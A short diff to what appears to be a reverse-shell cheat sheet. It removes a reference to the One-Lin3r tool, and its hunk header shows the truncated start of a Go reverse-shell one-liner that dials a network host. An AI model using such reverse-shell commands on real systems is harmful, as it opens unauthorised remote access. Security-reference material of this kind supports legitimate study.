@@ -7,10 +7,6 @@ $ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("t
 ---
 ## References
 
-### Github
-
-- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
-
 ### Hacktricks
 
 - [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
